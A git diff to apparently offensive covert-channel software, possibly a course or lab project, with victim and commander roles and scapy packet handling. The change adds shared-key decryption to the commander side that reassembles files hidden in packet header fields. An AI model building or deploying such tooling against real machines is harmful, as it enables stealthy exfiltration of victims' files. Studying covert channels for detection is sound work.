@@ -8,6 +8,7 @@ import time
 from scapy.layers.inet6 import IPv6
 from scapy.sendrecv import send, sniff
 import constants
+from victim_cryptography import *
 import importlib
 import inotify.adapters
 from scapy.layers.inet import IP, TCP, UDP, ICMP
@@ -293,13 +294,17 @@ def __bin_to_bytes(binary_string):
     return bytes(int(binary_string[i:i + 8], 2) for i in range(0, len(binary_string), 8))
 
 
-def covert_data_write_to_file(covert_data: str, filename: str):
+def covert_data_write_to_file(shared_key: bytes, covert_data: str, filename: str):
     """
     Creates a file (if does not exist) and writes binary data to the file.
     In addition, it decrypts the data beforehand.
 
+    @param shared_secret:
+        The shared key for symmetric encryption/decryption
+
     @param covert_data:
-        A string containing binary data
+        A string containing the entire binary data of the
+        target file (encrypted)
 
     @param filename:
         A string containing the file name
@@ -307,12 +312,14 @@ def covert_data_write_to_file(covert_data: str, filename: str):
     @return: None
     """
     if covert_data:
-        data = (__bin_to_bytes(covert_data)
-                .replace(constants.NULL_BYTE, b'')
-                .replace(constants.STX_BYTE, b''))
+        encrypted_data = (__bin_to_bytes(covert_data)
+                          .replace(constants.NULL_BYTE, b'')
+                          .replace(constants.STX_BYTE, b''))
+
+        decrypted_data = decrypt(encrypted_data, shared_key)
 
         with open(filename, constants.WRITE_BINARY_MODE) as f:
-            f.write(data)
+            f.write(decrypted_data)
 
 
 def get_packet_count(client_socket: socket):
@@ -1327,7 +1334,8 @@ def get_protocol_header_function_extract_map():
 
 def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
                         cmdr_port: int, source_ip: str,
-                        source_port: int, choices: tuple, filename: str):
+                        source_port: int, shared_key: bytes,
+                        choices: tuple, filename: str):
     # Initialize Variables
     received_packets = []
 
@@ -1428,7 +1436,7 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
                              for packet in received_packets if packet_callback(packet))
 
     # Write Data to File
-    covert_data_write_to_file(extracted_data, filename)
+    covert_data_write_to_file(shared_key, extracted_data, filename)
 
     # Send ACK to commander (if good)
     if is_file_openable(filename):
